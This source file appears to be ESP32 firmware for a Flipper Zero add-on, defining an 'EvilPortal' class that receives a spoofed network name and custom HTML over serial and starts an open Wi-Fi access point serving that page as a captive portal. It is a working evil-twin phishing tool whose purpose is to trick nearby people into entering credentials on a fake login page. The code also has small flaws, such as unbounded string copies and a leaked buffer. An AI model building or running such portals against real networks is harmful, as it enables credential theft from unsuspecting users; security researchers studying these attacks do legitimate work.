#pragma once
#include <WiFi.h>
#include <DNSServer.h>
#include <AsyncTCP.h>
#include "CommandLine.h"
#include <WiFiManager.h>

#define MAX_HTML_SIZE 20000

WiFiManager wifiManager;

// Fix For Stupid IOS Line Break Bug
const char* removeLineBreaks(const char* input) {
    char* buffer = new char[strlen(input) + 1];
    char* p = buffer;

    while (*input) {
        if (*input != '\n' && *input != '\r') {
            *p++ = *input;
        }
        input++;
    }
    *p = '\0';

    return buffer;
}

String readSerialBuffer(bool &isHtml, bool &isAp) {
    String buffer = "";
    buffer = Serial.readString();

    isHtml = buffer.startsWith("sethtml=");
    isAp = buffer.startsWith("setap=");

    return buffer;
}

class EvilPortal {
private:
  char ssid[100] = "";
  const char *password;
  String accumulatedHTML = "";
  bool has_html = false;
  bool has_ap = false;
  char HTML[MAX_HTML_SIZE] = "";

public:
  EvilPortal(){};

  void begin() {
    if (!wifiManager.startConfigPortal(removeLineBreaks((const char*)ssid), NULL, HTML)) {
      Serial.println("failed to connect and hit timeout");
      delay(3000);
      return;
    }

    Serial.printf("Evil Portal Started at %s", WiFi.softAPIP().toString().c_str());
  }

  void loop(CommandLine CLI) {
    if (Serial.available() > 0) {
      String flipperMessage;
      bool StartsWithHTML;
      bool StartsWithAP;
      flipperMessage = readSerialBuffer(StartsWithHTML, StartsWithAP);
      if (StartsWithHTML) {
        if (!has_html) {
          Serial.println("Found HTML Tag");
          flipperMessage = flipperMessage.substring(strlen("sethtml="));
          accumulatedHTML += flipperMessage;
          strncpy(HTML, accumulatedHTML.c_str(), accumulatedHTML.length());
          has_html = true;
          Serial.println("html set");
          accumulatedHTML = "";
        }
      } else if (StartsWithAP) {
        if (!has_ap) {
          Serial.println("Found Access Point Tag");
          flipperMessage = flipperMessage.substring(strlen("setap="));
          strncpy(ssid, flipperMessage.c_str(), flipperMessage.length());
          has_ap = true;
          Serial.println("ap set");
          digitalWrite(G_PIN, LOW);
          Serial.println("all set");
          ShouldMultithread = true;
          begin();
        }
      } else if (flipperMessage.startsWith("reset") || flipperMessage.startsWith("stop")) {
        Serial.println("reset Tag Found Rebooting");
        esp_restart();
      } else {
        Serial.println("Regular Command Called");
        CLI.loop(flipperMessage);
      }
    }
  }
};